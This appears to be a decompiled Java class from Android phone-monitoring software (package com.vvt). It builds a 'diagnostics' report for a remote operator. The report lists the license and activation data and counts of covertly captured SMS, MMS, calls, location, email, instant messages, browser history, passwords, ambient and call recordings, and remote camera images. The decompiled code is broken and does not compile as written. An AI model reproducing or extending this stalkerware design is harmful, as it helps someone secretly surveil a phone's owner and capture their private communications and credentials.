package com.vvt.remotecommand.processor.h;

import android.os.Build.VERSION;
import com.vvt.base.FeatureId;
import com.vvt.base.FxEventType;
import com.vvt.base.RunningMode;
import com.vvt.io.r;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputDiagnostics;
import com.vvt.remotecontrol.output.RmtCtrlOutputDiagnostics.LastConnection;
import com.vvt.remotecontrol.output.RmtCtrlOutputDiagnostics.LastPushConnection;
import com.vvt.remotecontrol.output.RmtCtrlOutputEventCount;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

public class c
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public c(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private int a(HashMap paramHashMap, FxEventType paramFxEventType)
  {
    boolean bool = paramHashMap.containsKey(paramFxEventType);
    Integer localInteger;
    int i;
    if (bool)
    {
      localInteger = (Integer)paramHashMap.get(paramFxEventType);
      i = localInteger.intValue();
    }
    for (;;)
    {
      return i;
      i = 0;
      localInteger = null;
    }
  }
  
  private String a(List paramList, RmtCtrlOutputDiagnostics paramRmtCtrlOutputDiagnostics, RmtCtrlOutputEventCount paramRmtCtrlOutputEventCount)
  {
    Object localObject1 = paramRmtCtrlOutputDiagnostics.getRunningMode();
    String str = System.getProperty("line.separator");
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    localSimpleDateFormat.<init>("dd/MM/yyyy HH:mm:ss");
    HashMap localHashMap1 = paramRmtCtrlOutputEventCount.getIncomingEvents();
    HashMap localHashMap2 = paramRmtCtrlOutputEventCount.getOutgoingEvents();
    HashMap localHashMap3 = paramRmtCtrlOutputEventCount.getOtherEvents();
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    Object localObject2 = new Object[1];
    Object localObject3 = paramRmtCtrlOutputDiagnostics.getProductId();
    localObject2[0] = localObject3;
    Object localObject4 = String.format("1.1>%s", (Object[])localObject2);
    localStringBuilder.append((String)localObject4).append(str);
    localObject2 = new Object[1];
    localObject3 = paramRmtCtrlOutputDiagnostics.getLicenStatus();
    localObject2[0] = localObject3;
    localObject4 = String.format("1.11>%s", (Object[])localObject2);
    localStringBuilder.append((String)localObject4).append(str);
    localObject2 = new Object[1];
    localObject3 = paramRmtCtrlOutputDiagnostics.getConfigurationID();
    localObject2[0] = localObject3;
    localObject4 = String.format("1.12>%s", (Object[])localObject2);
    localStringBuilder.append((String)localObject4).append(str);
    localObject2 = new Object[1];
    localObject3 = paramRmtCtrlOutputDiagnostics.getProductVersion();
    localObject2[0] = localObject3;
    localObject4 = String.format("1.2>%s", (Object[])localObject2);
    localStringBuilder.append((String)localObject4).append(str);
    localObject2 = new Object[1];
    localObject3 = Build.VERSION.RELEASE;
    localObject2[0] = localObject3;
    localObject4 = String.format("1.3>Android %s", (Object[])localObject2);
    localStringBuilder.append((String)localObject4).append(str);
    localObject2 = new Object[1];
    localObject3 = paramRmtCtrlOutputDiagnostics.getPhoneModel();
    localObject2[0] = localObject3;
    localObject4 = String.format("1.4>%s", (Object[])localObject2);
    localStringBuilder.append((String)localObject4).append(str);
    int i = 1;
    localObject2 = new Object[i];
    int m = 0;
    Object localObject5 = null;
    localObject3 = paramRmtCtrlOutputDiagnostics.getActivationCode();
    localObject2[0] = localObject3;
    localObject4 = String.format("1.6>%s", (Object[])localObject2);
    localStringBuilder.append((String)localObject4).append(str);
    localObject4 = FeatureId.CAPTURE_SMS;
    boolean bool3 = paramList.contains(localObject4);
    int i22;
    if (bool3)
    {
      localObject4 = FxEventType.SMS;
      int n = a(localHashMap1, (FxEventType)localObject4);
      localObject2 = FxEventType.SMS;
      i = a(localHashMap2, (FxEventType)localObject2);
      localObject5 = "2.1>%d, %d";
      i21 = 2;
      localObject3 = new Object[i21];
      i22 = 0;
      localObject6 = null;
      localObject4 = Integer.valueOf(n);
      localObject3[0] = localObject4;
      n = 1;
      localObject2 = Integer.valueOf(i);
      localObject3[n] = localObject2;
      localObject4 = String.format((String)localObject5, (Object[])localObject3);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_MMS;
    boolean bool4 = paramList.contains(localObject4);
    if (bool4)
    {
      localObject4 = FxEventType.MMS;
      int i1 = a(localHashMap1, (FxEventType)localObject4);
      localObject2 = FxEventType.MMS;
      i = a(localHashMap2, (FxEventType)localObject2);
      localObject5 = "2.2>%d, %d";
      i21 = 2;
      localObject3 = new Object[i21];
      i22 = 0;
      localObject6 = null;
      localObject4 = Integer.valueOf(i1);
      localObject3[0] = localObject4;
      i1 = 1;
      localObject2 = Integer.valueOf(i);
      localObject3[i1] = localObject2;
      localObject4 = String.format((String)localObject5, (Object[])localObject3);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_CALLLOG;
    boolean bool5 = paramList.contains(localObject4);
    if (bool5)
    {
      localObject4 = FxEventType.CALL_LOG;
      int i2 = a(localHashMap1, (FxEventType)localObject4);
      localObject2 = FxEventType.CALL_LOG;
      i = a(localHashMap2, (FxEventType)localObject2);
      localObject5 = FxEventType.CALL_LOG;
      m = a(localHashMap3, (FxEventType)localObject5);
      localObject3 = "2.3>%d, %d, %d";
      i22 = 3;
      localObject6 = new Object[i22];
      localObject4 = Integer.valueOf(i2);
      localObject6[0] = localObject4;
      localObject2 = Integer.valueOf(i);
      localObject6[1] = localObject2;
      i2 = 2;
      localObject2 = Integer.valueOf(m);
      localObject6[i2] = localObject2;
      localObject4 = String.format((String)localObject3, (Object[])localObject6);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_LOCATION;
    boolean bool6 = paramList.contains(localObject4);
    if (bool6)
    {
      bool6 = false;
      localObject4 = null;
      localObject2 = FeatureId.CAPTURE_LOCATION;
      boolean bool1 = paramList.contains(localObject2);
      int i3;
      if (bool1)
      {
        localObject4 = FxEventType.LOCATION;
        i3 = a(localHashMap3, (FxEventType)localObject4);
      }
      localObject2 = "2.4>%d";
      m = 1;
      localObject5 = new Object[m];
      i21 = 0;
      localObject3 = null;
      localObject4 = Integer.valueOf(i3);
      localObject5[0] = localObject4;
      localObject4 = String.format((String)localObject2, (Object[])localObject5);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_EMAIL;
    boolean bool7 = paramList.contains(localObject4);
    if (bool7)
    {
      localObject4 = RunningMode.LIMITED_1;
      if (localObject1 != localObject4)
      {
        localObject4 = RunningMode.FULL;
        if (localObject1 != localObject4) {}
      }
      else
      {
        localObject4 = FxEventType.MAIL;
        int i4 = a(localHashMap1, (FxEventType)localObject4);
        localObject2 = FxEventType.MAIL;
        j = a(localHashMap2, (FxEventType)localObject2);
        localObject5 = "2.5>%d, %d";
        i21 = 2;
        localObject3 = new Object[i21];
        i22 = 0;
        localObject6 = null;
        localObject4 = Integer.valueOf(i4);
        localObject3[0] = localObject4;
        i4 = 1;
        localObject2 = Integer.valueOf(j);
        localObject3[i4] = localObject2;
        localObject4 = String.format((String)localObject5, (Object[])localObject3);
        localObject4 = localStringBuilder.append((String)localObject4);
        ((StringBuilder)localObject4).append(str);
      }
    }
    localObject4 = FeatureId.CAPTURE_IM;
    boolean bool8 = paramList.contains(localObject4);
    if (bool8)
    {
      localObject4 = RunningMode.LIMITED_1;
      if (localObject1 != localObject4)
      {
        localObject4 = RunningMode.FULL;
        if (localObject1 != localObject4) {}
      }
      else
      {
        localObject4 = FxEventType.IM;
        int i5 = a(localHashMap1, (FxEventType)localObject4);
        localObject2 = FxEventType.IM;
        j = a(localHashMap2, (FxEventType)localObject2);
        localObject5 = "2.6>%d, %d";
        i21 = 2;
        localObject3 = new Object[i21];
        i22 = 0;
        localObject6 = null;
        localObject4 = Integer.valueOf(i5);
        localObject3[0] = localObject4;
        i5 = 1;
        localObject2 = Integer.valueOf(j);
        localObject3[i5] = localObject2;
        localObject4 = String.format((String)localObject5, (Object[])localObject3);
        localObject4 = localStringBuilder.append((String)localObject4);
        ((StringBuilder)localObject4).append(str);
      }
    }
    localObject4 = FeatureId.CAPTURE_BROWSER_URL;
    boolean bool9 = paramList.contains(localObject4);
    if (bool9)
    {
      localObject4 = FxEventType.BROWSER_URL;
      int i6 = a(localHashMap3, (FxEventType)localObject4);
      localObject2 = "2.8>%d";
      m = 1;
      localObject5 = new Object[m];
      i21 = 0;
      localObject3 = null;
      localObject4 = Integer.valueOf(i6);
      localObject5[0] = localObject4;
      localObject4 = String.format((String)localObject2, (Object[])localObject5);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_APPLICATION;
    boolean bool10 = paramList.contains(localObject4);
    if (bool10)
    {
      localObject4 = RunningMode.NORMAL;
      if (localObject1 != localObject4)
      {
        localObject4 = RunningMode.LIMITED_1;
        if (localObject1 != localObject4) {}
      }
      else
      {
        localObject4 = FxEventType.APPLICATION;
        int i7 = a(localHashMap3, (FxEventType)localObject4);
        localObject1 = "2.9>%d";
        j = 1;
        localObject2 = new Object[j];
        m = 0;
        localObject5 = null;
        localObject4 = Integer.valueOf(i7);
        localObject2[0] = localObject4;
        localObject4 = String.format((String)localObject1, (Object[])localObject2);
        localObject4 = localStringBuilder.append((String)localObject4);
        ((StringBuilder)localObject4).append(str);
      }
    }
    localObject4 = FeatureId.CAPTURE_SYSTEM;
    boolean bool11 = paramList.contains(localObject4);
    if (bool11)
    {
      localObject4 = FeatureId.CAPTURE_SYSTEM;
      bool11 = paramList.contains(localObject4);
      if (bool11)
      {
        localObject4 = FxEventType.SYSTEM;
        int i8 = a(localHashMap1, (FxEventType)localObject4);
        localObject1 = FxEventType.SYSTEM;
        i24 = a(localHashMap2, (FxEventType)localObject1);
        localObject2 = "2.10>%d, %d";
        m = 2;
        localObject5 = new Object[m];
        i21 = 0;
        localObject3 = null;
        localObject4 = Integer.valueOf(i8);
        localObject5[0] = localObject4;
        i8 = 1;
        localObject1 = Integer.valueOf(i24);
        localObject5[i8] = localObject1;
        localObject4 = String.format((String)localObject2, (Object[])localObject5);
        localObject4 = localStringBuilder.append((String)localObject4);
        ((StringBuilder)localObject4).append(str);
      }
    }
    localObject4 = FeatureId.CAPTURE_SETTINGS;
    boolean bool12 = paramList.contains(localObject4);
    if (bool12)
    {
      localObject4 = FxEventType.SETTINGS;
      int i9 = a(localHashMap3, (FxEventType)localObject4);
      localObject1 = "2.11>%d";
      j = 1;
      localObject2 = new Object[j];
      m = 0;
      localObject5 = null;
      localObject4 = Integer.valueOf(i9);
      localObject2[0] = localObject4;
      localObject4 = String.format((String)localObject1, (Object[])localObject2);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.PANIC;
    boolean bool13 = paramList.contains(localObject4);
    if (bool13)
    {
      localObject4 = FxEventType.PANIC_STATUS;
      i10 = a(localHashMap3, (FxEventType)localObject4);
      localObject1 = FxEventType.PANIC_IMAGE;
      i24 = a(localHashMap3, (FxEventType)localObject1);
      i10 += i24;
      localObject1 = "2.12>%d";
      j = 1;
      localObject2 = new Object[j];
      m = 0;
      localObject5 = null;
      localObject4 = Integer.valueOf(i10);
      localObject2[0] = localObject4;
      localObject4 = String.format((String)localObject1, (Object[])localObject2);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    int i24 = 0;
    localObject1 = null;
    int j = 0;
    localObject2 = null;
    m = 0;
    localObject5 = null;
    int i21 = 0;
    localObject3 = null;
    int i10 = 0;
    localObject4 = null;
    Object localObject6 = FeatureId.CAPTURE_CAMERAIMAGE;
    boolean bool22 = paramList.contains(localObject6);
    if (bool22)
    {
      localObject4 = FxEventType.CAMERA_IMAGE;
      i24 = a(localHashMap3, (FxEventType)localObject4);
      i10 = 1;
    }
    localObject6 = FeatureId.CAPTURE_SOUND_RECORDING;
    bool22 = paramList.contains(localObject6);
    if (bool22)
    {
      localObject4 = FxEventType.AUDIO_FILE;
      j = a(localHashMap3, (FxEventType)localObject4);
      i10 = 1;
    }
    localObject6 = FeatureId.CAPTURE_VIDEO_RECORDING;
    bool22 = paramList.contains(localObject6);
    if (bool22)
    {
      localObject4 = FxEventType.VIDEO_FILE;
      m = a(localHashMap3, (FxEventType)localObject4);
      i10 = 1;
    }
    localObject6 = FeatureId.CAPTURE_WALLPAPER;
    bool22 = paramList.contains(localObject6);
    if (bool22)
    {
      localObject4 = FxEventType.WALLPAPER;
      i21 = a(localHashMap3, (FxEventType)localObject4);
      i10 = 1;
    }
    int i23;
    if (i10 != 0)
    {
      i23 = 4;
      localObject6 = new Object[i23];
      localObject1 = Integer.valueOf(i24);
      localObject6[0] = localObject1;
      localObject2 = Integer.valueOf(j);
      localObject6[1] = localObject2;
      localObject2 = Integer.valueOf(m);
      localObject6[2] = localObject2;
      i24 = 3;
      localObject2 = Integer.valueOf(i21);
      localObject6[i24] = localObject2;
      localObject4 = String.format("2.13>%d,%d,%d,%d", (Object[])localObject6);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.AMBIENT_RECORDING;
    boolean bool14 = paramList.contains(localObject4);
    if (bool14)
    {
      localObject4 = FxEventType.AUDIO_AMBIENT;
      int i11 = a(localHashMap3, (FxEventType)localObject4);
      localObject1 = "2.14>%d";
      j = 1;
      localObject2 = new Object[j];
      m = 0;
      localObject5 = null;
      localObject4 = Integer.valueOf(i11);
      localObject2[0] = localObject4;
      localObject4 = String.format((String)localObject1, (Object[])localObject2);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_CALL_RECORDING;
    boolean bool15 = paramList.contains(localObject4);
    if (bool15)
    {
      localObject4 = FxEventType.AUDIO_CONVERSATION;
      int i12 = a(localHashMap3, (FxEventType)localObject4);
      localObject1 = "2.15>%d";
      j = 1;
      localObject2 = new Object[j];
      m = 0;
      localObject5 = null;
      localObject4 = Integer.valueOf(i12);
      localObject2[0] = localObject4;
      localObject4 = String.format((String)localObject1, (Object[])localObject2);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.REMOTE_CAMERA_IMAGE;
    boolean bool16 = paramList.contains(localObject4);
    if (bool16)
    {
      localObject4 = FxEventType.REMOTE_CAMERA_IMAGE;
      int i13 = a(localHashMap3, (FxEventType)localObject4);
      localObject1 = "2.16>%d";
      j = 1;
      localObject2 = new Object[j];
      m = 0;
      localObject5 = null;
      localObject4 = Integer.valueOf(i13);
      localObject2[0] = localObject4;
      localObject4 = String.format((String)localObject1, (Object[])localObject2);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_IM;
    boolean bool17 = paramList.contains(localObject4);
    if (bool17)
    {
      localObject4 = FxEventType.IM_ACCOUNT;
      int i14 = a(localHashMap3, (FxEventType)localObject4);
      localObject1 = FxEventType.IM_CONTACT;
      i24 = a(localHashMap3, (FxEventType)localObject1);
      localObject2 = FxEventType.IM_CONVERSATION;
      j = a(localHashMap3, (FxEventType)localObject2);
      localObject5 = "2.17>%d,%d,%d";
      i21 = 3;
      localObject3 = new Object[i21];
      i23 = 0;
      localObject6 = null;
      localObject4 = Integer.valueOf(i14);
      localObject3[0] = localObject4;
      localObject1 = Integer.valueOf(i24);
      localObject3[1] = localObject1;
      i14 = 2;
      localObject1 = Integer.valueOf(j);
      localObject3[i14] = localObject1;
      localObject4 = String.format((String)localObject5, (Object[])localObject3);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_VOIP_CALLLOG;
    boolean bool18 = paramList.contains(localObject4);
    if (bool18)
    {
      localObject4 = FxEventType.VOIP_CALL_LOG;
      int i15 = a(localHashMap1, (FxEventType)localObject4);
      localObject1 = FxEventType.VOIP_CALL_LOG;
      i24 = a(localHashMap2, (FxEventType)localObject1);
      localObject2 = "2.18>%d, %d";
      m = 2;
      localObject5 = new Object[m];
      i21 = 0;
      localObject3 = null;
      localObject4 = Integer.valueOf(i15);
      localObject5[0] = localObject4;
      i15 = 1;
      localObject1 = Integer.valueOf(i24);
      localObject5[i15] = localObject1;
      localObject4 = String.format((String)localObject2, (Object[])localObject5);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_PASSWORD;
    boolean bool19 = paramList.contains(localObject4);
    if (bool19)
    {
      localObject4 = FxEventType.PASSWORD;
      int i16 = a(localHashMap3, (FxEventType)localObject4);
      localObject1 = "2.21>%d";
      j = 1;
      localObject2 = new Object[j];
      m = 0;
      localObject5 = null;
      localObject4 = Integer.valueOf(i16);
      localObject2[0] = localObject4;
      localObject4 = String.format((String)localObject1, (Object[])localObject2);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = FeatureId.CAPTURE_VOIP_CALL_RECORDING;
    boolean bool20 = paramList.contains(localObject4);
    if (bool20)
    {
      localObject4 = FxEventType.VOIP_CALL_RECORDING;
      i17 = a(localHashMap1, (FxEventType)localObject4);
      localObject1 = FxEventType.VOIP_CALL_RECORDING;
      i24 = a(localHashMap2, (FxEventType)localObject1);
      localObject2 = "2.38>%d, %d";
      m = 2;
      localObject5 = new Object[m];
      i21 = 0;
      localObject3 = null;
      localObject4 = Integer.valueOf(i17);
      localObject5[0] = localObject4;
      i17 = 1;
      localObject1 = Integer.valueOf(i24);
      localObject5[i17] = localObject1;
      localObject4 = String.format((String)localObject2, (Object[])localObject5);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    localObject4 = paramRmtCtrlOutputDiagnostics.getLastConnection();
    localObject1 = new java/util/Date;
    long l = ((RmtCtrlOutputDiagnostics.LastConnection)localObject4).getTimeMs();
    ((Date)localObject1).<init>(l);
    localObject1 = localSimpleDateFormat.format((Date)localObject1);
    localObject5 = new Object[1];
    i21 = 0;
    localObject3 = null;
    localObject5[0] = localObject1;
    localObject1 = String.format("3.1>%s", (Object[])localObject5);
    localStringBuilder.append((String)localObject1).append(str);
    localObject2 = new Object[1];
    m = 0;
    localObject5 = null;
    localObject4 = ((RmtCtrlOutputDiagnostics.LastConnection)localObject4).getStatusCode();
    localObject2[0] = localObject4;
    localObject4 = String.format("3.2>%s", (Object[])localObject2);
    localStringBuilder.append((String)localObject4).append(str);
    localObject4 = paramRmtCtrlOutputDiagnostics.getCountryCode();
    int i17 = Integer.parseInt((String)localObject4);
    localObject1 = paramRmtCtrlOutputDiagnostics.getNetworkCode();
    i24 = Integer.parseInt((String)localObject1);
    boolean bool2 = a;
    if (bool2) {}
    int k = -1;
    if (i17 == k)
    {
      i17 = -1;
      if (i24 == i17) {}
    }
    else
    {
      i24 = 2;
      localObject1 = new Object[i24];
      localObject2 = null;
      localObject5 = paramRmtCtrlOutputDiagnostics.getCountryCode();
      localObject1[0] = localObject5;
      k = 1;
      localObject5 = paramRmtCtrlOutputDiagnostics.getNetworkCode();
      localObject1[k] = localObject5;
      localObject4 = String.format("4.1>%s, %s", (Object[])localObject1);
      localObject4 = localStringBuilder.append((String)localObject4);
      ((StringBuilder)localObject4).append(str);
    }
    boolean bool21 = a;
    if (bool21) {}
    localObject4 = paramRmtCtrlOutputDiagnostics.getNetworkOperatorName();
    if (localObject4 != null)
    {
      localObject4 = paramRmtCtrlOutputDiagnostics.getNetworkOperatorName();
      int i18 = ((String)localObject4).length();
      if (i18 > 0)
      {
        i24 = 1;
        localObject1 = new Object[i24];
        k = 0;
        localObject2 = null;
        localObject5 = paramRmtCtrlOutputDiagnostics.getNetworkOperatorName();
        localObject1[0] = localObject5;
        localObject4 = String.format("4.2>%s", (Object[])localObject1);
        localObject4 = localStringBuilder.append((String)localObject4);
        ((StringBuilder)localObject4).append(str);
      }
    }
    localObject1 = new Object[1];
    k = 0;
    localObject5 = paramRmtCtrlOutputDiagnostics.getWorkingDirectory();
    localObject1[0] = localObject5;
    localObject4 = String.format("5.1>%s", (Object[])localObject1);
    localStringBuilder.append((String)localObject4).append(str);
    localObject4 = r.c();
    localObject1 = r.d();
    localObject5 = new Object[2];
    localObject5[0] = localObject4;
    localObject5[1] = localObject1;
    localObject4 = String.format("5.2>%s,%s", (Object[])localObject5);
    localStringBuilder.append((String)localObject4).append(str);
    localObject4 = r.e();
    localObject1 = r.f();
    m = 2;
    localObject5 = new Object[m];
    i21 = 0;
    localObject3 = null;
    localObject5[0] = localObject4;
    localObject5[1] = localObject1;
    localObject4 = String.format("5.3>%s,%s", (Object[])localObject5);
    localObject4 = localStringBuilder.append((String)localObject4);
    ((StringBuilder)localObject4).append(str);
    int i19 = paramRmtCtrlOutputDiagnostics.hasIntegratedGps();
    boolean bool23 = paramRmtCtrlOutputDiagnostics.hasNetworkGps();
    localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    if (i19 != 0)
    {
      localObject4 = "Integrated";
      ((ArrayList)localObject2).add(localObject4);
    }
    if (bool23)
    {
      localObject4 = "Network";
      ((ArrayList)localObject2).add(localObject4);
    }
    bool23 = true;
    localObject1 = new Object[bool23];
    m = 0;
    localObject5 = null;
    localObject2 = ((ArrayList)localObject2).toArray();
    localObject3 = ",";
    localObject2 = com.vvt.ag.b.a((Object[])localObject2, (String)localObject3);
    localObject1[0] = localObject2;
    localObject4 = String.format("5.4>%s", (Object[])localObject1);
    localStringBuilder.append((String)localObject4).append(str);
    localObject4 = paramRmtCtrlOutputDiagnostics.getRunningMode();
    localObject1 = RunningMode.FULL;
    if (localObject4 == localObject1)
    {
      i19 = 1;
      localObject1 = "5.5>%s";
      k = 1;
      localObject2 = new Object[k];
      m = 0;
      localObject5 = null;
      if (i19 == 0) {
        break label3913;
      }
      i19 = 1;
    }
    for (;;)
    {
      localObject4 = Integer.valueOf(i19);
      localObject2[0] = localObject4;
      localObject4 = String.format((String)localObject1, (Object[])localObject2);
      localStringBuilder.append((String)localObject4).append(str);
      int i20 = paramRmtCtrlOutputDiagnostics.getCurrentBatteryLevel();
      localObject2 = new Object[1];
      localObject4 = Integer.valueOf(i20);
      localObject2[0] = localObject4;
      localObject4 = String.format("5.6>%d", (Object[])localObject2);
      localStringBuilder.append((String)localObject4).append(str);
      localObject4 = paramRmtCtrlOutputDiagnostics.getLastPushConnection();
      localObject1 = new java/util/Date;
      l = ((RmtCtrlOutputDiagnostics.LastPushConnection)localObject4).getDate();
      ((Date)localObject1).<init>(l);
      localObject1 = localSimpleDateFormat.format((Date)localObject1);
      localObject5 = new Object[1];
      localObject5[0] = localObject1;
      localObject1 = String.format("6.1>%s", (Object[])localObject5);
      localStringBuilder.append((String)localObject1).append(str);
      localObject2 = new Object[1];
      localObject3 = ((RmtCtrlOutputDiagnostics.LastPushConnection)localObject4).getProtocolType();
      localObject2[0] = localObject3;
      localObject1 = String.format("6.2>%s", (Object[])localObject2);
      localStringBuilder.append((String)localObject1).append(str);
      localObject2 = new Object[1];
      localObject3 = ((RmtCtrlOutputDiagnostics.LastPushConnection)localObject4).getConnectionType();
      localObject2[0] = localObject3;
      localObject1 = String.format("6.3>%s", (Object[])localObject2);
      localStringBuilder.append((String)localObject1).append(str);
      localObject2 = new Object[1];
      localObject3 = ((RmtCtrlOutputDiagnostics.LastPushConnection)localObject4).getConnectionStatus();
      localObject2[0] = localObject3;
      localObject1 = String.format("6.4>%s", (Object[])localObject2);
      localStringBuilder.append((String)localObject1).append(str);
      localObject2 = new Object[1];
      m = 0;
      localObject5 = null;
      i21 = ((RmtCtrlOutputDiagnostics.LastPushConnection)localObject4).getConnectionStatusCode();
      localObject3 = Integer.valueOf(i21);
      localObject2[0] = localObject3;
      localObject1 = String.format("6.5>%d", (Object[])localObject2);
      localObject1 = localStringBuilder.append((String)localObject1);
      ((StringBuilder)localObject1).append(str);
      localObject4 = ((RmtCtrlOutputDiagnostics.LastPushConnection)localObject4).getMessage();
      int i25 = ((String)localObject4).length();
      k = 142;
      if (i25 > k)
      {
        i25 = 0;
        localObject1 = null;
        k = 141;
        localObject4 = ((String)localObject4).substring(0, k);
      }
      boolean bool24 = a;
      if (bool24) {}
      localObject2 = new Object[1];
      localObject2[0] = localObject4;
      localObject4 = String.format("6.6>%s", (Object[])localObject2);
      localStringBuilder.append((String)localObject4);
      return localStringBuilder.toString();
      i20 = 0;
      localObject4 = null;
      break;
      label3913:
      i20 = 0;
      localObject4 = null;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, com.vvt.remotecommand.processor.c paramc)
  {
    int i = 0;
    Object[] arrayOfObject = null;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    boolean bool3 = a;
    if (bool3) {}
    int j = ((ArrayList)localObject1).size();
    if (j > 0)
    {
      localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject1).<init>();
      throw ((Throwable)localObject1);
    }
    boolean bool2 = a;
    if (bool2) {}
    com.vvt.remotecontrol.a locala = h();
    bool2 = a;
    if (bool2) {}
    List localList = com.vvt.remotecontrol.b.a(locala);
    bool2 = a;
    if (bool2) {}
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    Object localObject2 = RemoteFunction.GET_DIAGNOSTICS;
    ((ControlCommand)localObject1).<init>((RemoteFunction)localObject2, null);
    localObject1 = locala.execute((ControlCommand)localObject1);
    bool3 = localObject1 instanceof RmtCtrlOutputDiagnostics;
    if (bool3) {
      localObject1 = (RmtCtrlOutputDiagnostics)localObject1;
    }
    for (localObject2 = localObject1;; localObject2 = null)
    {
      bool2 = a;
      if (bool2) {}
      localObject1 = new com/vvt/remotecontrol/ControlCommand;
      RemoteFunction localRemoteFunction = RemoteFunction.GET_EVENT_COUNT;
      ((ControlCommand)localObject1).<init>(localRemoteFunction, null);
      localObject1 = locala.execute((ControlCommand)localObject1);
      boolean bool4 = localObject1 instanceof RmtCtrlOutputEventCount;
      if (bool4) {}
      for (localObject1 = (RmtCtrlOutputEventCount)localObject1;; localObject1 = null)
      {
        if ((localObject2 == null) || (localObject1 == null))
        {
          localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject1).<init>("Found internal error!");
          throw ((Throwable)localObject1);
        }
        localObject1 = a(localList, (RmtCtrlOutputDiagnostics)localObject2, (RmtCtrlOutputEventCount)localObject1);
        localObject2 = "%s";
        i = 1;
        arrayOfObject = new Object[i];
        bool4 = false;
        locala = null;
        arrayOfObject[0] = localObject1;
        localObject1 = String.format((String)localObject2, arrayOfObject);
        if (paramc != null) {
          paramc.b(paramRemoteCommand, this, (String)localObject1);
        }
        bool2 = a;
        if (bool2) {}
        return;
        bool2 = false;
      }
      bool3 = false;
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcRequestDiagnostics";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/AppEngine1/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */